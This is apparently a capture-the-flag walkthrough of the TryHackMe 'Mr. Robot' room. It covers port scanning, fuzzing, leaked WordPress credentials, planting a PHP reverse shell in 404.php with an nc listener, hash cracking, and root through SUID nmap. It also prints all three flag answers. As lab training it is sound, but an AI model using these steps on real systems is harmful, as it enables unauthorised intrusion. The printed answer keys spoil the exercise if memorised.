# Solution

## URL
- [Mr. Robot](https://tryhackme.com/room/mrrobot)

## Steps

### Enumerate
1. Run a full NMAP port scan with: `sudo nmap -v -sS -p- -A 10.10.57.14 | tee nmap-scan.txt`.
2. We can see that only port 80 and 443 are open.
3. Let's try to open it in our browser and look around.
4. We can run a bunch of different commands, the source code of the index page also doesn't reveal much.
5. We can check `/robots.txt` and `/sitemap.xml`.
6. The sitemap seems to be empty but `/robots.txt` gave us some interesting results:
    ```
    User-agent: *
    fsocity.dic
    key-1-of-3.txt
    ```
7. Navigating to `/key-1-of-3.txt` gave us our first answer: `073403c8a58a1f80d943455fb30724b9`.
8. Next download the `fsocity.dic` file using: `wget http://10.10.57.14/fsocity.dic`.
9. Let us also sort and remove duplicates from this file using: `sort fsocity.dic | uniq > fsocity-clean.dic`
10. Trying to enumerate directories/files using this wordlist: `ffuf -u http://10.10.57.14/FUZZ -w fsocity-clean.dic -mc 200,301,302,403 -v | tee ffuf-fsocity-clean-dic-dir.txt`
11. We found an endpoint called `license` which has a base64 encoded string `ZWxsaW90OkVSMjgtMDY1Mgo=`.
12. Decoding that using this: `echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d` we get some credentials: `elliot:ER28-0652`.
13. We also got a WordPress login page at `/login`. Let's try the above credentials there.

### Shell
1. Logged in successfully. We need to figure out a way to get reverse shell now.
2. To prepare a reverse shell do this: `cp /usr/share/webshells/php/php-reverse-shell.php .`.
3. Change the IP in the file to your TryHackMe OpenVPN IP.
4. Set up a listner: `nc -lvnp 1234`. Make sure the port number is same in reverse shell.
5. In WordPress admin panel, go to `Apprearance > Editor`, then in the right panel select `404.php` and replace the contents of the file with our reverse shell code.
6. Click `Update File` and navigate to a URL that definitely does not exist on the server such as: `/chdjkschjksdackds`. This will try to load the 404.php file which actually is our reverse shell and give us a connection.
7. We can stabilise our shell using: `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
8. Running `whoami` we get `daemon`.
9. Checking the `/home/robot` directory we found 2 files, `key-2-of-3.txt` which can only be read by user `robot`, which we are not currently and `password.raw-md5` which can be read by anyone, let us check that out.
10. `cat /home/robot/password.raw-md5` gives us this: `robot:c3fcd3d76192e4007dfb496cca67e13b`.

### PrivEsc
1. Cracking the hash at [crackstation](https://crackstation.net/) gives us the plain text: `abcdefghijklmnopqrstuvwxyz`.
2. Now let us try to login as `robot`, `su - robot`.
3. Logged in successfully. Navigate to `/home/robot` and read `key-2-of-3.txt`. Found key 2: `822c73956184f694993bede3eb39f959`.
4. Searching for `key-3-of-3.txt` using find command: `find / -name key-3-of-3.txt -type f 2> /dev/null`. Couldn't find anything, must be inside a directory we are not allowed to access such as `/root`.
5. Running `sudo -l` to check our privileges we find that we don't have sudo privileges.
6. Searching for SUID set files using: `find / -perm -u=s -type f 2>/dev/null`.
7. `/usr/local/bin/nmap` has SUID bit set, checking if it can be used for privesc at [GTFOBins](https://gtfobins.github.io/).
8. Trying the GTFOBins solution did not work since `--script` option is not recognized in this version of nmap. But in another [blog](https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/) I found the `--interactive` flag.
9. Using `nmap --interactive` and then running `!whoami` gives `root`. Bingo!
10. Now lets again try to find `key-3-of-3.txt`, using: `!find / -name key-3-of-3.txt -type f 2> /dev/null`.
11. It is indeed inside `/root/`, lets read it: `!cat /root/key-3-of-3.txt`.
12. Got key 3: `04787ddef27c3dee1ee161b21670b4e4`.


### Task 2:
#### What is key 1?
1. The answer is `073403c8a58a1f80d943455fb30724b9`.

#### What is key 2?
1. The answer is `822c73956184f694993bede3eb39f959`.

#### What is key 3?
1. The answer is `04787ddef27c3dee1ee161b21670b4e4`.